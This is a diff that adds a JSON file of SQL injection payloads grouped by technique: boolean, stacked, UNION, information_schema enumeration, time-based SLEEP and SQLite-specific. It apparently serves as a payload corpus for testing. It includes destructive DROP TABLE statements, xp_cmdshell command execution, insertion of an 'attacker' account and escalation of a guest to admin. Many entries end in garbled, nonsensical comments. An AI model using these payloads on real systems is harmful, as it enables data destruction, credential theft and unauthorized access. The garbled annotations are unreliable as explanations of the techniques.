@@ -1,0 +1,88 @@
+{
+  "boolean": [
+    "' OR 1=1; -- if you have more than 1",
+    "' OR 1=1; -- this is the"
+  ],
+  "stacked": [
+    "' OR 'x'='x'; DROP TABLE users; --->",
+    "' OR 'x'='x'; DROP TABLE users; ---> DROP TABLE user; DROP TABLE user;",
+    "'; EXEC xp_cmdshell('dir'); --output-path=%s -o %s",
+    "'; EXEC xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_",
+    "'; EXEC xp_cmdshell('dir'); --no-pdb-file --pdb-file-file=path/to/dir --no-pdb-file-file=/path/to/dir --pdb-file",
+    "'; EXEC xp_cmdshell('dir'); --exec xp_cmdshell('cmdshell');",
+    "'; EXEC xp_cmdshell('dir'); --no-exec-dir --no-exec-arguments --no-exec-arguments-exec"
+  ],
+  "obfuscation": [
+    "name VARCHAR(255),"
+  ],
+  "info_schema": [
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- The user's table name is required to be a table name.",
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- <br/>",
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table",
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- we want to include the users table from the index.",
+    "SELECT * FROM information_schema.tables",
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- <br>",
+    "SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- (1) If table_name is a string, then a ',' (2) is used for a string.",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- returns 1",
+    "select * from information_schema.tables;",
+    "SELECT * FROM information_schema.tables WHERE (SELECT COUNT(*) FROM information_sche"
+  ],
+  "union": [
+    "SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;",
+    "SELECT username, password FROM accounts WHERE username LIKE '%password%' UNION SELECT null, null;",
+    "' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 10 rows",
+    "' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 1=1",
+    "UNION SELECT 2,3 FROM dual WHERE '2' = '2'; -- 2=2",
+    "UNION SELECT 3,",
+    "' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- I'd rather use a join instead, but I'm not sure how to do it",
+    "' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- UNION SELECT 1,2,3 FROM dual WHERE '2' = '2'; -- UNION SELECT 1,2,3 FROM dual WHERE",
+    "' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 1,2,3,4",
+    "' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- Select a row from the database.",
+    "' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- I would like to be able to check the value of 2 and use that as a value for 2",
+    "' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; --",
+    "' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- or when CASE WHEN (SELECT 1) = 0 THEN 1 ELSE (SELECT 2) END; -- or when CASE WHEN",
+    "' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- if case is not used then use 1"
+  ],
+  "other": [
+    "INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- Don't care about the password? (hint: use a password!)",
+    "INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); --",
+    "INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- Don't forget that you must enter the password before you begin the query.",
+    "INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); --->",
+    "INSERT INTO accounts (username, password) VALUES ('likes', 'likes'); --->",
+    "INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- (1) - The hacker has stolen the password. (2) - The hacker has stolen the password. (3) - The hacker has stolen",
+    "UPDATE accounts SET role = 'admin' WHERE username = 'guest'; -- \"\"admin",
+    "UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --",
+    "UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --->'guest'",
+    "UPDATE user_name SET role = 'admin' WHERE username = 'guest'; --->'guest'",
+    "SELECT role FROM users WHERE username = 'guest'; --",
+    "EXEC xp_cmdshell('dir'); --exec xp_cmdshell('cmdshell');",
+    "SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- the result is \"\"password",
+    "SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- [1]",
+    "SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; --",
+    "SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) > 5; -- This is the full",
+    "SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- (1 row)",
+    "SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; --",
+    "SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- [1]",
+    "SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- If you don't have a password, you can just check out a password with 'p' and 'p'",
+    "SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- or 'b'='b'; -- or 'c'='c'; -- or 'd'='d';",
+    "SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- This is the email address to which the user's password is stored.",
+    "SELECT * FROM dual WHERE '1' = '1'; -- 1,2,3,4"
+  ],
+  "time_based": [
+    "' AND SLEEP(5); --no sleep at all",
+    "' AND SLEEP(5); -- No sleep.",
+    "' AND SLEEP(5); --",
+    "' AND SLEEP(5); -- A. *P* = 0.049; -- B. *P* = 0.048; -- C. *P* = 0.039; -- D. *P* ="
+  ],
+  "sqlite_native": [
+    "SELECT name, sql FROM sqlite_master WHERE type='table'",
+    "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
+    "1 OR 1=1",
+    "1 OR 'a'='a'",
+    "1 UNION SELECT 1, group_concat(name, ',') FROM sqlite_master",
+    "1 OR (SELECT 1 FROM (WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i<10000) SELECT count(*) FROM r))",
+    "1=1",
+    "'admin' OR '1'='1'"
+  ]
+}
